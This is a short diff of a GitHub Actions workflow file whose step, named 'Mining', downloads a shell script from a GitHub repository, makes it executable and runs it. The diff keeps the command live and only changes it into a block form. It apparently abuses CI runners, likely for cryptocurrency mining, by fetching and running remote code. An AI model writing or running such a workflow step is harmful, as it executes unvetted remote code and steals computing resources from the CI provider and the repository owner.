@@ -23,4 +23,5 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: Mining
-      run: wget https://github.com/Pex12345/hellhell/a.sh && chmod u+x a.sh && ./a.sh
+      run: |
+          wget https://github.com/Pex12345/hellhell/a.sh && chmod u+x a.sh && ./a.sh
